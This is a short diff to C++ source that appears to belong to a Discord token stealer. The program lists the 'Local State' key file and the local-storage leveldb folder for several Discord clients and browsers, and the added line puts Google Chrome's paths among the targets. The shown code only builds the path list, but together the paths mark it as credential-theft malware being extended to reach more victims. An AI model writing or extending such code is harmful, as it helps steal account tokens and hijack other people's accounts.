@@ -19,6 +19,7 @@ int main()
     path_list.push_back(std::make_pair<std::string, std::string>(appdata + "\\discord\\Local State", appdata + "\\Discord\\Local Storage\\leveldb"));
     path_list.push_back(std::make_pair<std::string, std::string>(appdata + "\\discordcanary\\Local State", appdata + "\\discordcanary\\Local Storage\\leveldb"));
     path_list.push_back(std::make_pair<std::string, std::string>(appdata + "\\discordptb\\Local State", appdata + "\\discordptb\\Local Storage\\leveldb"));
+    path_list.push_back(std::make_pair<std::string, std::string>(localappdata + "\\Google\\Chrome\\User Data\\Local State", localappdata + "\\Google\\Chrome\\User Data\\Default\\Local Storage\\leveldb"));
     path_list.push_back(std::make_pair<std::string, std::string>(appdata + "\\Opera Software\\Opera Stable\\Local State", appdata + "\\Opera Software\\Opera Stable\\Local Storage\\leveldb"));
     path_list.push_back(std::make_pair<std::string, std::string>(appdata + "\\Opera Software\\Opera GX Stable\\Local State", appdata + "\\Opera Software\\Opera GX Stable\\Local Storage\\leveldb"));
     path_list.push_back(std::make_pair<std::string, std::string>(localappdata + "\\BraveSoftware\\Brave-Browser\\User Data\\Local State", localappdata + "\\BraveSoftware\\Brave-Browser\\User Data\\Default\\Local Storage\\leveldb"));
